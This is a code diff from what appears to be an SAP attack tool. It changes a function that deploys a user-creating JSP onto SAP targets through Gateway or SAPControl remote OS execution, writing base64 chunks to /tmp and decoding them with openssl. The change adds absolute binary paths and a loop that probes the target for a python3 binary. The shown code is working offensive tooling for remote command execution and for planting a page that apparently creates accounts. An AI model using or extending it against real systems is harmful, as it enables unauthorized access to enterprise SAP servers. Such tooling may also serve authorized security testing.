@@ -788,7 +788,16 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
         #     single-line base64 blob (which is what our chunk loop
         #     produces).  With -A single-line input is accepted.
         #   cleanup -> /bin/rm -f FILE
-        chunk_shell = "python3"
+        # ABSOLUTE paths for every binary the deploy touches.
+        # sapstartsrv (used by the SAPControl OSExecute channel)
+        # runs with PATH=/usr/sap/<SID>/<inst>/exe only, so bare
+        # "python3" fails at execve.  GW SAPXPG's exec context has
+        # a wider PATH so the old bare form worked there — but
+        # absolute is fine on both channels.  Detect the actual
+        # python3 location via `command -v` probe below since it
+        # varies (/usr/bin/python3 on Debian/RHEL/SLES modern,
+        # /usr/local/bin/python3 on some rolling distros).
+        chunk_shell = "/usr/bin/python3"
         decode_shell = "/usr/bin/openssl"
         cleanup_shell = "/bin/rm"
         tmp_b64 = f"/tmp/sapmap_ume_{suffix}.b64"
@@ -837,16 +846,40 @@ def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
 
     # 0a) Preflight: on Linux confirm python3 is reachable.  If not,
     # we'd silently waste ~40 RFC calls and then fail at decode.
+    # Probe a few common absolute paths — sapstartsrv's restricted
+    # PATH means the bare binary name won't find anything.
     if linux:
-        probe = exec_fn(chunk_shell, "--version")
-        probe_out = " ".join(str(l) for l in
-                                (probe.get("output") or [])).strip()
-        if not probe.get("success") or not probe_out:
+        python3_candidates = [
+            chunk_shell,             # default /usr/bin/python3
+            "/usr/local/bin/python3",
+            "/opt/python3/bin/python3",
+            "/usr/bin/python3.9",
+            "/usr/bin/python3.8",
+            "/usr/bin/python3.6",
+        ]
+        found = ""
+        for cand in python3_candidates:
+            probe = exec_fn(cand, "--version")
+            probe_out = " ".join(str(l) for l in
+                                    (probe.get("output") or [])).strip()
+            if probe.get("success") and probe_out:
+                found = cand
+                if cand != chunk_shell:
+                    print(f"[+] {node.sid}: python3 preflight — "
+                          f"using {cand} ({probe_out[:80]})")
+                else:
+                    print(f"[+] {node.sid}: python3 preflight OK: "
+                          f"{probe_out[:80]}")
+                break
+        if not found:
             return {"success": False,
-                    "error": (f"{chunk_shell} preflight failed on target "
-                              f"(output: {probe_out[:200] or '<empty>'}, "
-                              f"err: {probe.get('error', '?')}) — python3 "
-                              f"may not be in PATH for the gateway user.")}
+                    "error": (
+                        f"python3 not reachable via any absolute path "
+                        f"({', '.join(python3_candidates)}) — install "
+                        f"python3 on the target, or the SAPControl "
+                        f"OSExecute credential lacks read access on "
+                        f"those paths.")}
+        chunk_shell = found
         print(f"[+] {node.sid}: preflight OK: {probe_out[:200]}")
 
     # 0) Clean up any prior leftover
